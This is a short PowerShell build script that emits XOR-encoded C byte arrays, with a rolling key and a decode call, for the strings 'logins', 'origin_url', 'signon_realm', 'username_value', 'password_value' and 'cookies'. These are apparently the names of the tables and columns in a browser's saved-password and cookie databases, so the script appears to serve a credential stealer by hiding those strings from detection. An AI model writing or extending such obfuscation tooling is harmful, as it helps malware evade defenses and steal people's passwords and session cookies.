# Generate inline XOR for SQLite column names with rolling key
$base_key = 0x5A
$keys = @($base_key, ($base_key -bxor 0x37), ($base_key -bxor 0x91), ($base_key -bxor 0xC5))

function InlineXor($name, $str) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
    $enc = for ($i = 0; $i -lt $bytes.Length; $i++) {
        "0x{0:x2}" -f ($bytes[$i] -bxor $keys[$i % 4])
    }
    Write-Output "${name}: BYTE _b[]={$($enc -join ',')}; _xd(_v,_b,$($bytes.Length),0x5A);/*$str*/"
}

InlineXor "logins" "logins"
InlineXor "origin_url" "origin_url"
InlineXor "signon_realm" "signon_realm"
InlineXor "username_value" "username_value"
InlineXor "password_value" "password_value"
InlineXor "cookies" "cookies"
